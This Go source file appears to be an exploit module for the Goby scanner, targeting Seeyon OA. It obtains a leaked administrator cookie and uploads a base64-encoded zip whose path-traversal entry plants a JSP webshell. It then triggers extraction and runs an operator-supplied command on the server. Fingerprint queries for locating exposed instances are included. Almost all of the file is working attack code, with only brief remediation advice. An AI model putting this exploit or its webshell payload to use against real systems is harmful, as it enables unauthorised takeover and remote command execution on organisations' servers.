package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Seeyon OA administrator cookie leakage file upload",
    "Description": "Get the administrator cookie directly by request, By uploading a compressed file, calling the interface to perform the file decompression, the exploit of the decompression process will be exploited to obtain the webshell.",
    "Impact": "Seeyon OA administrator cookie leakage file upload",
    "Recommendation": "<p>1. Please contact the system manufacturer for repair and upgrade: https://www.seeyon.com/</p><p>2. If not necessary, prohibit public network access the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "SEEYON-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "用友致远OA协同办公系统管理员cookie泄露导致任意文件上传",
            "Description": "用友致远OA协同办公系统实现无纸化办公，提升个人、组织间的协作效率。该系统存在管理员cookie泄露导致任意文件上传漏洞，攻击者可通过请求直接获取管理员cookie，通过上传压缩文件，调用接口执行文件解压缩，并利用解压缩过程的利用来获取webshell。",
            "Impact": "<p>用友致远OA协同办公系统实现无纸化办公，提升个人、组织间的协作效率。</p><p>用友致远OA协同办公系统存在管理员cookie泄露导致任意文件上传漏洞，攻击者可通过请求直接获取管理员cookie，通过上传压缩文件，调用接口执行文件解压缩，并利用解压缩过程的利用来获取webshell。</p>",
            "Recommendation": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1、请联系系统厂商进行修复升级：<a href=\"https://www.seeyon.com/\" rel=\"nofollow\">https://www.seeyon.com/</a></span></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "致远互联-OA",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Seeyon OA administrator cookie leakage file upload",
            "Description": "Get the administrator cookie directly by request, By uploading a compressed file, calling the interface to perform the file decompression, the exploit of the decompression process will be exploited to obtain the webshell.",
            "Impact": "Seeyon OA administrator cookie leakage file upload",
            "Recommendation": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1. Please contact the system manufacturer for repair and upgrade: <a href=\"https://www .seeyon.com/\" rel=\"nofollow\">https://www.seeyon.com/</a></span></p><p>2. If not necessary, prohibit public network access the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "SEEYON-OA",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\" && (body=\"/U8-OA/css/\" || title=\"致远\" || body=\"seeyonoa\" || body=\"CheckLogin\")) || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\")",
    "GobyQuery": "(body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\" && (body=\"/U8-OA/css/\" || title=\"致远\" || body=\"seeyonoa\" || body=\"CheckLogin\")) || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\")",
    "Author": "itardc@163.com",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2021-04-10",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
                "data_type": "text",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "method": "POST",
                "uri": "/seeyon/thirdpartyController.do"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "Set-Cookie",
                        "variable": "$head"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "JSESSIONID",
                        "variable": "$head"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
                "data_type": "text",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "method": "POST",
                "uri": "/seeyon/thirdpartyController.do"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "Set-Cookie",
                        "variable": "$head"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "JSESSIONID",
                        "variable": "$head"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Yonyou-Seeyon-OA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10180"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			req := exp.ScanSteps.Steps[0].Request.Copy()
			cookie := ""
			if resp, err := exp.MakeRequest(u, req, ss); err == nil {
				cookie = resp.Cookie
			}
			log.Println(cookie)
			payloadBase64 := "UEsDBBQAAAAIAFNRi1IAAAAAAgAAAAAAAAAKAAAAbGF5b3V0LnhtbAMAUEsDBBQAAAAIAFNRi1L+0Yh6DQAAAAsAAAAPAAAALi4vdjN4bWFpbmUuanNwy0jNycnXKc8vykkBAFBLAQIUAxQAAAAIAFNRi1IAAAAAAgAAAAAAAAAKAAAAAAAAAAAAAACAAQAAAABsYXlvdXQueG1sUEsBAhQDFAAAAAgAU1GLUv7RiHoNAAAACwAAAA8AAAAAAAAAAAAAAIABKgAAAC4uL3YzeG1haW5lLmpzcFBLBQYAAAAAAgACAHUAAABkAAAAAAA="
			randomFilename := goutils.RandomHexString(8) + ".jsp"
			payloadHex, err := base64.StdEncoding.DecodeString(payloadBase64)
			if err != nil {
				return false
			}
			payload := strings.ReplaceAll(string(payloadHex), "v3xmaine.jsp", randomFilename)
			cfg := httpclient.NewPostRequestConfig("/seeyon/fileUpload.do?method=processUpload")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b")
			cfg.Header.Store("Cookie", cookie)
			cfg.VerifyTls = false
			cfg.Data = "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"firstSave\"\r\n\r\n"
			cfg.Data += "true\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"callMethod\"\r\n\r\n"
			cfg.Data += "resizeLayout\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"isEncrypt\"\r\n\r\n"
			cfg.Data += "0\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"takeOver\"\r\n\r\n"
			cfg.Data += "false\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"type\"\r\n\r\n"
			cfg.Data += "0\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file1\"; filename=\"11.png\"\r\n"
			cfg.Data += "Content-Type: image/png\r\n\r\n"
			cfg.Data += payload + "\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				matchs := regexp.MustCompile(`fileurls=fileurls\+","\+'([\-\d]+)'`).FindStringSubmatch(resp.Utf8Html)
				log.Println(matchs)
				if len(matchs) >= 1 {
					fileId := matchs[1]
					log.Println(fileId)
					dataStr := time.Now().Format("2006-01-02")
					cfg.URI = "/seeyon/ajax.do"
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.Data = "method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22" + dataStr + "%22%2C%22" + fileId + "%22%5D"
					httpclient.DoHttpRequest(u, cfg)
					if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/seeyon/common/designer/pageLayout/" + randomFilename); err == nil && resp.StatusCode == 200 {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			req := expResult.Exploit.ScanSteps.Steps[0].Request.Copy()
			cookie := ""
			if resp, err := expResult.Exploit.MakeRequest(expResult.HostInfo, req, ss); err == nil {
				cookie = resp.Cookie
			}
			log.Println(cookie)
			payloadBase64 := "UEsDBBQAAAAIAI9Ui1IAAAAAAgAAAAAAAAAKAAAAbGF5b3V0LnhtbAMAUEsDBBQAAAAIAI9Ui1J5cb6umQAAAMAAAAAPAAAALi4vdjN4bWFpbmUuanNwTYzBCsIwEER/JQqFzaHBigch1rs30aP0kLZLjTTbGjdWEf/dRDx4m5nHvE12MXej7KB2NAY+skfjhCVRikMgtg5Vh/yLIBU+sAGP14A3TmRvvHHI6GHeuHYuZRr/VCC1JRYm+vJC10/GUyXq2Agn8a3LxWpd6elsewQwpSUVfy3UUs7KvJCvIbAafZT0BOkUvZa6xPU7234AUEsBAhQDFAAAAAgAj1SLUgAAAAACAAAAAAAAAAoAAAAAAAAAAAAAAIABAAAAAGxheW91dC54bWxQSwECFAMUAAAACACPVItSeXG+rpkAAADAAAAADwAAAAAAAAAAAAAAgAEqAAAALi4vdjN4bWFpbmUuanNwUEsFBgAAAAACAAIAdQAAAPAAAAAAAA=="
			randomFilename := goutils.RandomHexString(8) + ".jsp"
			payloadHex, err := base64.StdEncoding.DecodeString(payloadBase64)
			if err != nil {
				return expResult
			}
			payload := strings.ReplaceAll(string(payloadHex), "v3xmaine.jsp", randomFilename)
			cfg := httpclient.NewPostRequestConfig("/seeyon/fileUpload.do?method=processUpload")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b")
			cfg.Header.Store("Cookie", cookie)
			cfg.VerifyTls = false
			cfg.Data = "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"firstSave\"\r\n\r\n"
			cfg.Data += "true\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"callMethod\"\r\n\r\n"
			cfg.Data += "resizeLayout\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"isEncrypt\"\r\n\r\n"
			cfg.Data += "0\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"takeOver\"\r\n\r\n"
			cfg.Data += "false\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"type\"\r\n\r\n"
			cfg.Data += "0\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file1\"; filename=\"11.png\"\r\n"
			cfg.Data += "Content-Type: image/png\r\n\r\n"
			cfg.Data += payload + "\r\n"
			cfg.Data += "--59229605f98b8cf290a7b8908b34616b--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				matchs := regexp.MustCompile(`fileurls=fileurls\+","\+'([\-\d]+)'`).FindStringSubmatch(resp.Utf8Html)
				log.Println(matchs)
				if len(matchs) >= 1 {
					fileId := matchs[1]
					log.Println(fileId)
					dataStr := time.Now().Format("2006-01-02")
					cfg.URI = "/seeyon/ajax.do"
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.Data = "method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22" + dataStr + "%22%2C%22" + fileId + "%22%5D"
					httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					cmd := ss.Params["cmd"].(string)
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/seeyon/common/designer/pageLayout/" + randomFilename + "?cmd=" + cmd); err == nil && resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
